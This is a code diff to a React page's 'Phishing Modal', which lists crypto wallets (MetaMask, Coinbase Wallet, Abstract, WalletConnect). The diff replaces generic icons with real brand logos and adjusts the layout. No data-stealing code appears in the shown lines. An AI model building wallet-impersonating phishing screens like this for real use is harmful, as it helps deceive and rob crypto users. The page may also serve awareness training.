@@ -141,7 +141,7 @@ export default function Home() {
       {/* Phishing Modal */}
       {showPhishingModal && (
         <div style={{
-          position: "fixed",
+          position: "relative",
           top: 0,
           left: 0,
           width: "100%",
@@ -216,26 +216,25 @@ export default function Home() {
             <div className="wallet-list">
               <div className="wallet-option">
                 <div className="wallet-icon">
-                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/meta.svg" alt="MetaMask" />
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/2048px-MetaMask_Fox.svg.png" alt="MetaMask" />
                 </div>
                 <span className="wallet-name">MetaMask</span>
-                <span className="installed-tag">Installed</span>
               </div>
               <div className="wallet-option">
                 <div className="wallet-icon" style={{ backgroundColor: "#0052FF" }}>
-                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/generic.svg" alt="Coinbase Wallet" />
+                  <img src="https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg" alt="Coinbase Wallet" />
                 </div>
                 <span className="wallet-name">Coinbase Wallet</span>
               </div>
               <div className="wallet-option">
                 <div className="wallet-icon" style={{ backgroundColor: "#00A5FF" }}>
-                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/generic.svg" alt="Abstract" />
+                  <img src="https://assets.gemwallet.com/blockchains/abstract/logo.png" alt="Abstract" />
                 </div>
                 <span className="wallet-name">Abstract</span>
               </div>
               <div className="wallet-option">
                 <div className="wallet-icon" style={{ backgroundColor: "#3B99FC" }}>
-                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/generic.svg" alt="WalletConnect" />
+                  <img src="https://images.seeklogo.com/logo-png/43/1/walletconnect-logo-png_seeklogo-430923.png" alt="WalletConnect" />
                 </div>
                 <span className="wallet-name">WalletConnect</span>
               </div>
